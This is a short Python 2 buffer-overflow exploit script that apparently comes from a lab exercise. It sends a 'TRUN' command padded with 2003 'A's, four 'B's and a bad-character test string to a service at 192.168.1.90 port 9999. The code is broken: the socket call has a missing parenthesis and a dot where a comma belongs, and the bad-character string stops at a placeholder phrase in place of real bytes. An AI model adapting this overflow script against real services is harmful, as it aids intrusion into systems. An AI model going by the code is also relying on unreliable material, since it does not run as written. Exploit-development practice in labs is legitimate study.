#!/usr/bin/python

import sys, socket

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x10\x11\x12\x13\x14\x15\x16 continues in hex to f")

shellcode = "A" * 2003 + "B" * 4 + badchars

try:
    s=socket.socket(socket.AF_INET.socket.SOCK_STREAM
    s.connect(('192.168.1.90',9999))
    s.send(('TRUN //.:/' + shellcode))
    s.close()

except:
    print "Error connecting to server"
    sys.exit()
